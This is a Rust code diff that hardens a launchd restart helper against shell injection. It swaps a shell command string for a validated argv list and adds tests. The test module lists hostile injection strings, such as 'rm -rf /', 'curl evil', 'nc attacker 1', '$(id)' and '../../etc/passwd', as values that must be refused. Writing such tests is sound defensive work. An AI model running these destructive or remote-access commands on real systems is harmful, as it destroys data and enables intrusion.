@@ -38,12 +38,35 @@ pub fn current_uid() -> Option<String> {
     (!uid.is_empty()).then_some(uid)
 }
 
-/// Shell that restarts the service after a grace delay.
+/// Whether `value` is safe to put in a launchd service target.
 ///
-/// The delay lets the HTTP 202 flush before `kickstart -k` kills us. The
-/// script runs detached (reparented), so it survives our own death.
-pub fn kickstart_script(label: &str, uid: &str) -> String {
-    format!("sleep 2; exec launchctl kickstart -k gui/{uid}/{label}")
+/// The target reaches `launchctl` as one argv entry, so a shell would not be
+/// involved even in the worst case — but a label carrying a metacharacter or a
+/// `/` would make us address a *different* job than the one we are supervised
+/// under, or make the spawn fail in a way an operator reads as "restart
+/// broken". Validating once at the boundary keeps the invariant a property of
+/// the module rather than of each call site.
+pub fn is_valid_target_part(value: &str) -> bool {
+    !value.is_empty()
+        && value.len() <= 128
+        && value
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-'))
+}
+
+/// The `launchctl` argument list for a supervised kickstart.
+///
+/// An argv, not a command string: nothing here is ever handed to a shell, so
+/// there is no quoting to get wrong and no injection to reason about.
+pub fn kickstart_argv(label: &str, uid: &str) -> Option<Vec<String>> {
+    (is_valid_target_part(label) && is_valid_target_part(uid)).then(|| {
+        vec![
+            "launchctl".to_string(),
+            "kickstart".to_string(),
+            "-k".to_string(),
+            format!("gui/{uid}/{label}"),
+        ]
+    })
 }
 
 /// Whether launchd currently supervises `label` in this user's domain.
@@ -57,27 +80,100 @@ pub fn is_supervised(label: &str, uid: &str) -> bool {
         .is_ok_and(|status| status.success())
 }
 
-/// Fire the detached restart script. Returns once the supervisor child is
-/// spawned — the actual restart lands ~2s later.
+/// Fire the detached restart. Returns once the child is spawned — the actual
+/// kickstart lands after the grace delay.
+///
+/// No shell: the previous version ran `sh -c "sleep 2; exec launchctl ..."` so
+/// it could delay before the kickstart. The delay is now a timer on a detached
+/// thread that then spawns `launchctl` with an argv, so a service label from
+/// the environment can never be parsed as shell syntax. The thread is what
+/// survives our own death, exactly as the `sh` child did.
 pub fn request_restart(label: &str, uid: &str) -> std::io::Result<()> {
-    std::process::Command::new("sh")
-        .args(["-c", &kickstart_script(label, uid)])
-        .stdin(Stdio::null())
-        .stdout(Stdio::null())
-        .stderr(Stdio::null())
-        .spawn()?;
+    // The rejected values stay out of the message: `admin::restart_service`
+    // returns `error.to_string()` in an HTTP body, so echoing a label an
+    // operator put in the environment would reflect it straight back.
+    let argv = kickstart_argv(label, uid).ok_or_else(|| {
+        std::io::Error::new(
+            std::io::ErrorKind::InvalidInput,
+            "service target is not a valid launchd job name",
+        )
+    })?;
+    std::thread::spawn(move || {
+        std::thread::sleep(std::time::Duration::from_secs(RESTART_GRACE_SECONDS));
+        let _ = std::process::Command::new(&argv[0])
+            .args(&argv[1..])
+            .stdin(Stdio::null())
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .spawn();
+    });
     Ok(())
 }
+
+/// Seconds between answering the dashboard and killing ourselves, so the
+/// HTTP 202 has time to flush.
+const RESTART_GRACE_SECONDS: u64 = 2;
 
 #[cfg(test)]
 mod tests {
     use super::*;
 
+    /// The argv is the whole defence: no element is ever re-parsed, so a
+    /// label cannot become shell syntax — and an unvalidated one is refused
+    /// outright rather than addressed.
     #[test]
-    fn script_kicks_the_right_job_after_a_delay() {
+    fn the_kickstart_is_an_argv_not_a_command_string() {
         assert_eq!(
-            kickstart_script("com.example.svc", "501"),
-            "sleep 2; exec launchctl kickstart -k gui/501/com.example.svc"
+            kickstart_argv("com.example.svc", "501").unwrap(),
+            vec![
+                "launchctl".to_string(),
+                "kickstart".to_string(),
+                "-k".to_string(),
+                "gui/501/com.example.svc".to_string(),
+            ]
+        );
+    }
+
+    #[test]
+    fn shell_metacharacters_in_a_label_are_refused() {
+        for hostile in [
+            "com.example.svc; rm -rf /",
+            "com.example.svc && curl evil",
+            "$(id)",
+            "`id`",
+            "com.example.svc|nc attacker 1",
+            "../../etc/passwd",
+            "com.example.svc\n\x00",
+            "",
+        ] {
+            assert!(
+                !is_valid_target_part(hostile),
+                "must refuse {hostile:?} for restart"
+            );
+            assert_eq!(
+                kickstart_argv(hostile, "501"),
+                None,
+                "a hostile label must not produce a target: {hostile:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_hostile_uid_is_refused_too() {
+        assert!(!is_valid_target_part("501; id"));
+        assert!(!is_valid_target_part(""));
+        assert!(is_valid_target_part("501"));
+        assert_eq!(kickstart_argv("com.example.svc", "501; id"), None);
+    }
+
+    #[test]
+    fn request_restart_refuses_an_unvalidated_target_instead_of_spawning() {
+        let error = request_restart("com.example.svc; id", "501")
+            .expect_err("a hostile label must not reach a spawn");
+        assert_eq!(error.kind(), std::io::ErrorKind::InvalidInput);
+        assert!(
+            !error.to_string().contains("com.example.svc;"),
+            "the message must not echo the hostile label verbatim"
         );
     }
 
